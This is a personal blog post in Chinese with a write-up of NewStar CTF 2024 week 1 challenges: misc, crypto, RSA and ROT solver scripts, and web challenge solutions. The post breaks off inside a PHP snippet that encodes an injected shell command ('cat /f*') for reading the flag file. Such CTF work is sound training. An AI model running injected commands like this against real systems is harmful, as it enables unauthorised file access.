<!DOCTYPE html>
<html lang="en" dir="auto" data-theme="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>Newstar2024 | 0raN9e&#39;s Blog</title>
<meta name="keywords" content="ctf">
<meta name="description" content="前言:后面也没怎么打了，又没时间自己又笨，抄个冷饭放上来吧。
week1
Signin
ez_answer
正常答题老实一点就出flag了，正常的规则
Misc
decompress
前几层正常的解压，到最后一层有hint提示，是正则提示简单的看一下，一共是五位密码，前三位是小写字母，第四位数字，第五位是小写字母，用常见的爆破工具进行爆破一下就行，需要十分钟左右的时间吧爆破出来的密码是xtr4m，进去打开第一个压缩包就有flag

pleasingMusic

aud看一下有摩斯电码，用在线网站先进行初步的音频分离，然后利用题目正反都好听，将.-从后往前敲自己在线网站手敲一下得到编码ez_morse_code，最后套个flag
WhereIsFlag
flag在proc/self/envrion里面,典型的藏在环境变量里
Labyrinth
简单的lsb查找

兑换码
import sys
import zlib
import struct

if len(sys.argv) != 2:
    print(&#34;Usage: python script.py &lt;png_path&gt;&#34;)
    sys.exit(1)

file = sys.argv[1]
fr = open(file, &#39;rb&#39;).read()
data = bytearray(fr[12:29])

# 获取 CRC32 校验和
crc32key = struct.unpack(&#39;&gt;I&#39;, fr[29:33])[0] &amp; 0xffffffff
print(f&#34;CRC32 Key: {crc32key}&#34;)

n = 4096
found = False

for w in range(n):
    width = bytearray(struct.pack(&#39;&gt;i&#39;, w))
    for h in range(n):
        height = bytearray(struct.pack(&#39;&gt;i&#39;, h))
        for x in range(4):
            data[x&#43;4] = width[x]
            data[x&#43;8] = height[x]
        crc32result = zlib.crc32(data)
        if crc32result == crc32key:
            print(f&#34;Width: {w}, Height: {h}&#34;)
            print(f&#34;Data: {data}&#34;)
            newpic = bytearray(fr)
            for x in range(4):
                newpic[x&#43;16] = width[x]
                newpic[x&#43;20] = height[x]
            with open(file, &#39;wb&#39;) as fw:
                fw.write(newpic)
            print(f&#34;新图片已保存为: {file}&#34;)
            found = True
            break
    if found:
        break
简单的crc爆破，直接脚本梭就行了，flag在底部">
<meta name="author" content="">
<link rel="canonical" href="http://localhost:1313/posts/ctf/newstar2024/newstar2024/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/ctf/newstar2024/newstar2024/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
                color-scheme: dark;
            }

            .list {
                background: var(--theme);
            }

            .toc {
                background: var(--entry);
            }
        }

        @media (prefers-color-scheme: light) {
            .list::-webkit-scrollbar-thumb {
                border-color: var(--code-bg);
            }
        }

    </style>
</noscript>
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.querySelector("html").dataset.theme = 'dark';
    } else if (localStorage.getItem("pref-theme") === "light") {
       document.querySelector("html").dataset.theme = 'light';
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.querySelector("html").dataset.theme = 'dark';
    } else {
        document.querySelector("html").dataset.theme = 'light';
    }

</script>
</head>
<body id="top">
    <header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="0raN9e&#39;s Blog (Alt + H)">0raN9e&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="首页">
                    <span>首页</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="标签">
                    <span>标签</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="搜索">
                    <span>搜索</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about/" title="关于">
                    <span>关于</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/links/" title="友链">
                    <span>友链</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Newstar2024
    </h1>
    <div class="post-meta">

</div>
  </header> 
  <div class="post-content"><p>前言:后面也没怎么打了，又没时间自己又笨，抄个冷饭放上来吧。</p>
<h1 id="week1">week1<a hidden class="anchor" aria-hidden="true" href="#week1">#</a></h1>
<h2 id="signin">Signin<a hidden class="anchor" aria-hidden="true" href="#signin">#</a></h2>
<h3 id="ez_answer">ez_answer<a hidden class="anchor" aria-hidden="true" href="#ez_answer">#</a></h3>
<p>正常答题老实一点就出flag了，正常的规则</p>
<h2 id="misc">Misc<a hidden class="anchor" aria-hidden="true" href="#misc">#</a></h2>
<h3 id="decompress">decompress<a hidden class="anchor" aria-hidden="true" href="#decompress">#</a></h3>
<p>前几层正常的解压，到最后一层有hint提示，是正则提示简单的看一下，一共是五位密码，前三位是小写字母，第四位数字，第五位是小写字母，用常见的爆破工具进行爆破一下就行，需要十分钟左右的时间吧爆破出来的密码是xtr4m，进去打开第一个压缩包就有flag</p>
<p><img alt="1" loading="lazy" src="../../images/Newstar/2024/1.png"></p>
<h3 id="pleasingmusic">pleasingMusic<a hidden class="anchor" aria-hidden="true" href="#pleasingmusic">#</a></h3>
<p><img alt="2" loading="lazy" src="../../images/Newstar/2024/2.png"></p>
<p>aud看一下有摩斯电码，用在线网站先进行初步的音频分离，然后利用题目正反都好听，将.-从后往前敲自己在线网站手敲一下得到编码ez_morse_code，最后套个flag</p>
<h3 id="whereisflag">WhereIsFlag<a hidden class="anchor" aria-hidden="true" href="#whereisflag">#</a></h3>
<p>flag在proc/self/envrion里面,典型的藏在环境变量里</p>
<h3 id="labyrinth">Labyrinth<a hidden class="anchor" aria-hidden="true" href="#labyrinth">#</a></h3>
<p>简单的lsb查找</p>
<p><img alt="1" loading="lazy" src="../../images/Newstar/2024/3.png"></p>
<h3 id="兑换码">兑换码<a hidden class="anchor" aria-hidden="true" href="#兑换码">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> zlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Usage: python script.py &lt;png_path&gt;&#34;</span>)
</span></span><span style="display:flex;"><span>    sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>file <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>fr <span style="color:#f92672">=</span> open(file, <span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> bytearray(fr[<span style="color:#ae81ff">12</span>:<span style="color:#ae81ff">29</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 获取 CRC32 校验和</span>
</span></span><span style="display:flex;"><span>crc32key <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&gt;I&#39;</span>, fr[<span style="color:#ae81ff">29</span>:<span style="color:#ae81ff">33</span>])[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;CRC32 Key: </span><span style="color:#e6db74">{</span>crc32key<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#ae81ff">4096</span>
</span></span><span style="display:flex;"><span>found <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> w <span style="color:#f92672">in</span> range(n):
</span></span><span style="display:flex;"><span>    width <span style="color:#f92672">=</span> bytearray(struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&gt;i&#39;</span>, w))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> h <span style="color:#f92672">in</span> range(n):
</span></span><span style="display:flex;"><span>        height <span style="color:#f92672">=</span> bytearray(struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&gt;i&#39;</span>, h))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>            data[x<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> width[x]
</span></span><span style="display:flex;"><span>            data[x<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> height[x]
</span></span><span style="display:flex;"><span>        crc32result <span style="color:#f92672">=</span> zlib<span style="color:#f92672">.</span>crc32(data)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> crc32result <span style="color:#f92672">==</span> crc32key:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Width: </span><span style="color:#e6db74">{</span>w<span style="color:#e6db74">}</span><span style="color:#e6db74">, Height: </span><span style="color:#e6db74">{</span>h<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Data: </span><span style="color:#e6db74">{</span>data<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            newpic <span style="color:#f92672">=</span> bytearray(fr)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>                newpic[x<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>] <span style="color:#f92672">=</span> width[x]
</span></span><span style="display:flex;"><span>                newpic[x<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>] <span style="color:#f92672">=</span> height[x]
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> open(file, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> fw:
</span></span><span style="display:flex;"><span>                fw<span style="color:#f92672">.</span>write(newpic)
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;新图片已保存为: </span><span style="color:#e6db74">{</span>file<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            found <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> found:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span></code></pre></div><p>简单的crc爆破，直接脚本梭就行了，flag在底部</p>
<h2 id="crypto">Crypto<a hidden class="anchor" aria-hidden="true" href="#crypto">#</a></h2>
<h3 id="xor">xor<a hidden class="anchor" aria-hidden="true" href="#xor">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> bytes_to_long, long_to_bytes
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 密钥和加密的值</span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;New_Star_CTF&#39;</span>
</span></span><span style="display:flex;"><span>c1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">8091799978721254458294926060841</span>
</span></span><span style="display:flex;"><span>c2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;;:</span><span style="color:#ae81ff">\x1c</span><span style="color:#e6db74">1&lt;</span><span style="color:#ae81ff">\x03</span><span style="color:#e6db74">&gt;*</span><span style="color:#ae81ff">\x10\x11</span><span style="color:#e6db74">u;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 解密 m1</span>
</span></span><span style="display:flex;"><span>m1 <span style="color:#f92672">=</span> c1 <span style="color:#f92672">^</span> bytes_to_long(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 解密 m2</span>
</span></span><span style="display:flex;"><span>m2 <span style="color:#f92672">=</span> bytes(a <span style="color:#f92672">^</span> b <span style="color:#66d9ef">for</span> a, b <span style="color:#f92672">in</span> zip(c2, key))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 将解密的结果转换为字节并打印</span>
</span></span><span style="display:flex;"><span>flag_part1 <span style="color:#f92672">=</span> long_to_bytes(m1)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
</span></span><span style="display:flex;"><span>flag_part2 <span style="color:#f92672">=</span> m2<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 输出完整的 flag</span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> flag_part1 <span style="color:#f92672">+</span> flag_part2
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;Decrypted flag:&#39;</span>, flag)
</span></span></code></pre></div><h3 id="base">Base<a hidden class="anchor" aria-hidden="true" href="#base">#</a></h3>
<p>赛博厨子一把梭</p>
<p><img alt="4" loading="lazy" src="../../images/Newstar/2024/4.png"></p>
<h3 id="一眼秒了">一眼秒了<a hidden class="anchor" aria-hidden="true" href="#一眼秒了">#</a></h3>
<p>简单的rsa，题目说n小小的也很可爱，用factordb在线网站看看发现有因子，带入p直接上exp</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> gmpy2 <span style="color:#f92672">import</span> invert
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 已知的值</span>
</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#ae81ff">52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span>
</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> <span style="color:#ae81ff">48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069</span>
</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> <span style="color:#ae81ff">7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956044421</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 计算 q</span>
</span></span><span style="display:flex;"><span>q <span style="color:#f92672">=</span> n <span style="color:#f92672">//</span> p
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 计算 φ(n)</span>
</span></span><span style="display:flex;"><span>phi_n <span style="color:#f92672">=</span> (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 计算 d</span>
</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> invert(e, phi_n)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 解密</span>
</span></span><span style="display:flex;"><span>m <span style="color:#f92672">=</span> pow(c, d, n)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 输出解密后的 flag</span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> long_to_bytes(m)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;Decrypted flag:&#39;</span>, flag<span style="color:#f92672">.</span>decode())
</span></span></code></pre></div><h3 id="strange-king">Strange King<a hidden class="anchor" aria-hidden="true" href="#strange-king">#</a></h3>
<p>rot的变形移位</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt_flag</span>(encrypted_flag):
</span></span><span style="display:flex;"><span>    decrypted_flag <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    shift_values <span style="color:#f92672">=</span> [<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">17</span>,<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">21</span>,<span style="color:#ae81ff">23</span>,<span style="color:#ae81ff">25</span>,<span style="color:#ae81ff">27</span>,<span style="color:#ae81ff">29</span>,<span style="color:#ae81ff">31</span>,<span style="color:#ae81ff">33</span>,<span style="color:#ae81ff">35</span>,<span style="color:#ae81ff">37</span>,<span style="color:#ae81ff">39</span>,<span style="color:#ae81ff">41</span>,<span style="color:#ae81ff">43</span>,<span style="color:#ae81ff">45</span>,<span style="color:#ae81ff">47</span>,<span style="color:#ae81ff">49</span>,<span style="color:#ae81ff">51</span>,<span style="color:#ae81ff">53</span>,<span style="color:#ae81ff">55</span>,<span style="color:#ae81ff">57</span>,<span style="color:#ae81ff">59</span>,<span style="color:#ae81ff">61</span>]  <span style="color:#75715e"># 移位值</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i, char <span style="color:#f92672">in</span> enumerate(encrypted_flag):
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 计算移位</span>
</span></span><span style="display:flex;"><span>        shift <span style="color:#f92672">=</span> shift_values[i <span style="color:#f92672">%</span> len(shift_values)]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> char<span style="color:#f92672">.</span>isalpha():  <span style="color:#75715e"># 只处理字母</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># 处理大写字母</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> char<span style="color:#f92672">.</span>isupper():
</span></span><span style="display:flex;"><span>                new_char <span style="color:#f92672">=</span> chr((ord(char) <span style="color:#f92672">-</span> ord(<span style="color:#e6db74">&#39;A&#39;</span>) <span style="color:#f92672">-</span> shift) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> ord(<span style="color:#e6db74">&#39;A&#39;</span>))
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># 处理小写字母</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> char<span style="color:#f92672">.</span>islower():
</span></span><span style="display:flex;"><span>                new_char <span style="color:#f92672">=</span> chr((ord(char) <span style="color:#f92672">-</span> ord(<span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#f92672">-</span> shift) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> ord(<span style="color:#e6db74">&#39;a&#39;</span>))
</span></span><span style="display:flex;"><span>            decrypted_flag<span style="color:#f92672">.</span>append(new_char)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            decrypted_flag<span style="color:#f92672">.</span>append(char)  <span style="color:#75715e"># 非字母字符不变</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(decrypted_flag)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 测试</span>
</span></span><span style="display:flex;"><span>encrypted_flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ksjr</span><span style="color:#e6db74">{EcxvpdErSvcDgdgEzxqjql}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>decrypted_flag <span style="color:#f92672">=</span> decrypt_flag(encrypted_flag)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;Decrypted flag:&#39;</span>, decrypted_flag)
</span></span></code></pre></div><h2 id="web">Web<a hidden class="anchor" aria-hidden="true" href="#web">#</a></h2>
<h3 id="headach3">headach3<a hidden class="anchor" aria-hidden="true" href="#headach3">#</a></h3>
<p><img alt="5" loading="lazy" src="../../images/Newstar/2024/5.png"></p>
<h3 id="会赢吗">会赢吗<a hidden class="anchor" aria-hidden="true" href="#会赢吗">#</a></h3>
<p>第一部分看源码flag{WA0w</p>
<p>第二部分!_y4_r3al</p>
<p><img alt="5" loading="lazy" src="../../images/Newstar/2024/6.png"></p>
<p>第三部分1y_Gr4sP</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// 修改状态为 &#34;解封&#34;
</span></span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;state&#39;</span>).<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;解封&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 获取实际的 CSRF 令牌
</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">csrfTokenValue</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;csrf_token&#39;</span>).<span style="color:#a6e22e">value</span>; <span style="color:#75715e">// 确保这个元素存在
</span></span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 发送请求
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/api/flag/s34l&#39;</span>, {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span>
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#a6e22e">csrf_token</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">csrfTokenValue</span> })
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">response</span> =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">json</span>())
</span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`第三部分Flag: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">flag</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, 下一关: /</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">nextLevel</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;无&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>.<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">error</span> =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;请求过程中出现错误:&#39;</span>, <span style="color:#a6e22e">error</span>));
</span></span></code></pre></div><p>第四部分fSkpKcyF9</p>
<pre tabindex="0"><code>// 获取 CSRF 令牌
const csrfToken = document.getElementById(&#39;csrf_token&#39;).value;

// 发送请求
fetch(&#39;/api/flag/Ap3x&#39;, {
    method: &#39;POST&#39;,
    headers: {
        &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;
    },
    body: `csrf_token=${encodeURIComponent(csrfToken)}`
})
.then(response =&gt; response.json())
.then(data =&gt; {
    console.log(`Flag: ${data.flag}`);
})
.catch(error =&gt; console.error(&#39;请求过程中出现错误:&#39;, error));
</code></pre><p>flag{WA0w!_y4_r3al1y_Gr4sP}？不对，应该直接ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9然后再转base64的</p>
<h3 id="智械危机">智械危机<a hidden class="anchor" aria-hidden="true" href="#智械危机">#</a></h3>
<p>找到对应的然后跑脚本填入得到flag</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$decrypted_cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;cat /f*&#39;</span>;
</span></span><span style="display:flex;"><span>$cmd<span style="color:#f92672">=</span><span style="color:#a6e22e">base64_encode</span>($decrypted_cmd);
</span></span><span style="display:flex;"><span>$reversed_cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
